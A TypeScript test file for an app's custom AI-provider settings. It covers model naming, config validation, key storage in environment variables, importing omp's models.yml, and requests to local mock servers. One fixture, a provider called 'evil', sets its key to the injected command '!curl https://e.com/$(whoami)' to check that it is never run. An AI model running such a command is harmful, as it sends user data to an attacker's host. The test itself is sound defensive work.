import { createServer } from 'node:http'
import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { createModels } from '@earendil-works/pi-ai/models'
import { fromOmp, isProviderKeyEnv, keyEnv, modelName, normalizeProvider } from '../src/shared/providers'
import { buildProviders, importOmp, listProviders, providerInfo, removeProvider, saveProvider } from '../src/main/providers'
import { describeModels } from '../src/main/models'

const tmp = mkdtempSync(join(tmpdir(), 'manul-providers-'))

describe('custom providers: config', () => {
  it('names models the way people say them', () => {
    expect(modelName('gpt-5.6-terra')).toBe('GPT-5.6 Terra')
    expect(modelName('gpt-6-astra')).toBe('GPT-6 Astra')
    expect(modelName('llama-3.3-70b')).toBe('Llama 3.3 70b')
  })
  it('tidies a provider and refuses what would not work', () => {
    const p = normalizeProvider({ name: 'Azure AI Foundry', baseUrl: 'https://x.services.ai.azure.com/openai/v1/', models: ['gpt-5.6-terra', 'gpt-5.6-terra', ' gpt-5.6-luna '] })
    expect(p).toMatchObject({ id: 'azure-ai-foundry', baseUrl: 'https://x.services.ai.azure.com/openai/v1', api: 'openai-responses' })
    expect(p.models.map(m => m.id)).toEqual(['gpt-5.6-terra', 'gpt-5.6-luna'])
    expect(() => normalizeProvider({ name: 'X', baseUrl: 'http://example.com', models: ['m'] })).toThrow(/https/)
    expect(normalizeProvider({ name: 'Local', baseUrl: 'http://localhost:8080/v1', models: ['m'] }).baseUrl).toBe('http://localhost:8080/v1')
    expect(() => normalizeProvider({ name: 'X', baseUrl: 'https://e.com', models: [] })).toThrow(/model/)
    expect(() => normalizeProvider({ name: 'OpenAI', baseUrl: 'https://e.com', models: ['m'] })).toThrow(/built-in/)
    expect(() => normalizeProvider({ name: 'A', baseUrl: 'https://e.com', models: ['m'] }, ['a'])).toThrow(/already/)
    expect(() => normalizeProvider({ name: 'A', baseUrl: 'https://e.com', models: ['m'], keyHeader: 'api key' })).toThrow(/header/)
  })
  it('keeps provider keys in their own env names', () => {
    expect(keyEnv('azure-foundry')).toBe('MANUL_PROVIDER_AZURE_FOUNDRY_KEY')
    expect(isProviderKeyEnv(keyEnv('azure-foundry'))).toBe(true)
    expect(isProviderKeyEnv('PATH')).toBe(false)
  })
  it("reads omp's models.yml: providers, models, the key header, !cat key files (never other commands)", () => {
    const got = fromOmp({
      providers: {
        'azure-foundry': {
          baseUrl: 'https://peter.services.ai.azure.com/openai/v1', api: 'openai-responses',
          apiKey: '!cat ~/.config/k', headers: { 'api-key': '!cat ~/.config/k' },
          models: [{ id: 'gpt-5.6-terra', name: 'GPT-5.6 Terra (Azure AI Foundry)', reasoning: true, input: ['text', 'image'] }, { id: 'gpt-5.6-luna', input: ['text'] }],
        },
        evil: { baseUrl: 'https://e.com', apiKey: '!curl https://e.com/$(whoami)', models: [{ id: 'm' }] },
        plain: { baseUrl: 'https://p.com/v1', api: 'openai-completions', apiKey: 'sk-1', models: [{ id: 'm' }] },
        broken: { baseUrl: 'not a url', models: [{ id: 'm' }] },
      },
    }, '/home/me')
    expect(got.map(g => g.provider.id)).toEqual(['azure-foundry', 'evil', 'plain'])
    const az = got[0]
    expect(az.provider).toMatchObject({ name: 'Azure Foundry', keyHeader: 'api-key', api: 'openai-responses' })
    expect(az.provider.models).toEqual([
      { id: 'gpt-5.6-terra', name: 'GPT-5.6 Terra', reasoning: true, images: true },
      { id: 'gpt-5.6-luna', name: 'GPT-5.6 Luna', reasoning: true, images: false },
    ])
    expect(az.keySource).toEqual({ file: '/home/me/.config/k' })
    expect(got[1].keySource).toEqual({})
    expect(got[1].key).toBeUndefined()
    expect(got[2].key).toBe('sk-1')
  })
})

describe('custom providers: stored, imported, used by the agent', () => {
  let server: ReturnType<typeof createServer>
  afterAll(() => server?.close())

  it('sends supported reasoning for Sol when the agent leaves thinking off, while preserving explicit effort', async () => {
    const efforts: string[] = []
    const endpoint = createServer((req, res) => {
      let body = ''
      req.on('data', c => (body += c))
      req.on('end', () => {
        const request = JSON.parse(body)
        efforts.push(request.reasoning?.effort)
        if (!['low', 'medium', 'high', 'xhigh', 'max'].includes(request.reasoning?.effort)) {
          res.writeHead(400, { 'content-type': 'application/json' })
          res.end(JSON.stringify({ error: { message: 'Unsupported reasoning effort' } }))
          return
        }
        res.writeHead(200, { 'content-type': 'text/event-stream' })
        res.end(`data: ${JSON.stringify({ type: 'response.completed', response: { id: 'r1', status: 'completed', output: [], usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 } } })}\n\n`)
      })
    })
    await new Promise<void>(r => endpoint.listen(0, '127.0.0.1', r))
    try {
      const port = (endpoint.address() as { port: number }).port
      const provider = normalizeProvider({ name: 'Sol test', baseUrl: `http://localhost:${port}/v1`, models: ['gpt-6.1-sol', 'gpt-6.1-sol-2026-09-29'] })
      const models = createModels({ authContext: { env: async () => 'test-key', fileExists: async () => false } })
      for (const p of buildProviders([provider])) models.setProvider(p as any)
      for (const id of provider.models.map(m => m.id)) {
        const model = models.getModel(provider.id, id)!
        const context = { messages: [{ role: 'user', content: 'hi', timestamp: Date.now() }] }
        const reply = await (models as any).completeSimple(model, context)
        expect(reply.stopReason).not.toBe('error')
        for (const reasoning of ['off', 'low', 'medium', 'high']) {
          const reply = await (models as any).completeSimple(model, context, { reasoning })
          expect(reply.stopReason).not.toBe('error')
        }
      }
      expect(efforts).toEqual(['high', 'high', 'low', 'medium', 'high', 'high', 'high', 'low', 'medium', 'high'])
    } finally {
      await new Promise<void>((resolve, reject) => endpoint.close(e => e ? reject(e) : resolve()))
    }
  })

  it('imports from omp with the key read from its file, never exposing the key', () => {
    writeFileSync(join(tmp, 'key'), 'secret-azure\n')
    writeFileSync(join(tmp, 'models.yml'), `providers:\n  azure-foundry:\n    baseUrl: https://x.services.ai.azure.com/openai/v1\n    api: openai-responses\n    apiKey: "!cat ${join(tmp, 'key')}"\n    headers:\n      api-key: "!cat ${join(tmp, 'key')}"\n    models:\n      - id: gpt-5.6-terra\n      - id: gpt-5.6-luna\n`)
    const added = importOmp(join(tmp, 'models.yml'))
    expect(added).toEqual([{ id: 'azure-foundry', name: 'Azure Foundry', models: 2, key: true }])
    expect(process.env.MANUL_PROVIDER_AZURE_FOUNDRY_KEY).toBe('secret-azure')
    expect(JSON.stringify(providerInfo())).not.toContain('secret-azure')
    expect(providerInfo()[0].keySet).toBe(true)
    // importing again replaces, never duplicates
    importOmp(join(tmp, 'models.yml'))
    expect(listProviders()).toHaveLength(1)
  })

  it('renaming keeps the id (projects keep their pick) and the key; removing drops both', () => {
    const { id: _id, ...rest } = listProviders()[0]
    saveProvider({ ...rest, name: 'Foundry' }, undefined, 'azure-foundry')
    expect(listProviders().map(p => [p.id, p.name])).toEqual([['azure-foundry', 'Foundry']])
    expect(process.env.MANUL_PROVIDER_AZURE_FOUNDRY_KEY).toBe('secret-azure')
    removeProvider('azure-foundry')
    expect(listProviders()).toEqual([])
    expect(process.env.MANUL_PROVIDER_AZURE_FOUNDRY_KEY).toBeUndefined()
  })

  it('appears in the model list only with a key, and the agent reaches the endpoint with it', async () => {
    const seen: { url?: string; auth?: string; apiKey?: string; model?: string } = {}
    server = createServer((req, res) => {
      let body = ''
      req.on('data', c => (body += c))
      req.on('end', () => {
        Object.assign(seen, { url: req.url, auth: req.headers.authorization, apiKey: req.headers['api-key'], model: JSON.parse(body || '{}').model })
        res.writeHead(200, { 'content-type': 'text/event-stream' })      // pi-ai always streams
        const chunk = (delta: object, finish: string | null = null, usage?: object) =>
          res.write(`data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', model: 'gpt-5.6-terra', choices: [{ index: 0, delta, finish_reason: finish }], ...(usage ? { usage } : {}) })}\n\n`)
        chunk({ role: 'assistant', content: 'hello from terra' })
        chunk({}, 'stop', { prompt_tokens: 3, completion_tokens: 4, total_tokens: 7 })
        res.end('data: [DONE]\n\n')
      })
    })
    await new Promise<void>(r => server.listen(0, '127.0.0.1', () => r()))
    const port = (server.address() as { port: number }).port

    saveProvider({ name: 'Test Foundry', baseUrl: `http://localhost:${port}/v1`, api: 'openai-completions', keyHeader: 'api-key', models: [{ id: 'gpt-5.6-terra' }] })
    const models = createModels({ authContext: { env: async (n: string) => process.env[n], fileExists: async () => false } })
    for (const p of buildProviders()) models.setProvider(p as any)
    expect(await models.getAvailable()).toEqual([])                           // no key yet: not offered

    saveProvider(listProviders()[0], 'sk-test', 'test-foundry')
    for (const p of buildProviders()) models.setProvider(p as any)              // rebuilt with the key (agent.keysChanged)
    const avail = (await models.getAvailable()) as any[]
    expect(describeModels(avail, { 'test-foundry': 'Test Foundry' })).toEqual([expect.objectContaining({ provider: 'test-foundry', providerLabel: 'Test Foundry', modelId: 'gpt-5.6-terra', name: 'GPT-5.6 Terra' })])

    const model = models.getModel('test-foundry', 'gpt-5.6-terra')!
    const msg = await (models as any).completeSimple(model, { messages: [{ role: 'user', content: 'hi', timestamp: Date.now() }] })
    expect(seen).toMatchObject({ url: '/v1/chat/completions', auth: 'Bearer sk-test', apiKey: 'sk-test', model: 'gpt-5.6-terra' })
    expect(JSON.stringify(msg.content)).toContain('hello from terra')
  })
})
